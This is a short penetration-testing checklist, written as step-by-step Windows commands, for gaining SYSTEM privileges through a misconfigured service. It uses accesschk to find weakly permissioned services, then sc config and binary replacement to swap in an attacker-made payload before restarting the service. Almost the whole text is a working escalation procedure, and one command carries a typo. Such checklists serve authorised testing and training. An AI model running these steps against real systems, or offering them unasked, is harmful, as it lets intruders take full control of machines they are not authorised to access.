# Penetration Testing Checklist

A complete Windows checklist to gain SYSTEM through a misconfigured service.

This guide is written in a methodical step-by-step process, it is recommended not skipping steps.&nbsp;
&nbsp;

*Query to list potentially vulnerable services*
```Windows
accesschk.exe -uwcqv *
accesschk64.exe -uqcqv *
```

*Stop the desired service*
```Windows
sc stop {service-name}
```

*Change the service binary path with a created payload*
```Windows
sc config {service-name} binPath= "E:\Service.exe"
```

*Replace the service binary with a created payload*
```Windows
icacls C:\{binary-path}
>> Copy and paste new binary into the above directory
```

*Start the desired service*
```Windows
sc start {service-name}
```
